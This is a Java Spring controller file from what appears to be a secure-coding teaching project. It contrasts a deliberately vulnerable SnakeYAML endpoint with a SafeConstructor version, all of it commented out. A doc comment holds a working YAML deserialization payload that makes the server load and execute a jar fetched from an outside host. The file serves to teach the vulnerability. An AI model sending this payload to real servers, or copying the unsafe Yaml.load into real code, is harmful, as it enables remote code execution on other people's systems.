package com.madaha.codesecone.controller.yaml;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

@RequestMapping("/yaml")
public class YamlLoad {

    // YAML远程类加载 -- >本地RCE命令执行
    // 下面这部分是 java-sec-code::RCE.java 的一段代码










//    /**
//     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
//     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
//     *
//     * @param content payloads
//     */
//    @GetMapping("/vuln/yarm")
//    public void yarm(String content) {
//        Yaml y = new Yaml();
//        y.load(content);
//    }
//
//    @GetMapping("/sec/yarm")
//    public void secYarm(String content) {
//        Yaml y = new Yaml(new SafeConstructor());
//        y.load(content);
//    }

}
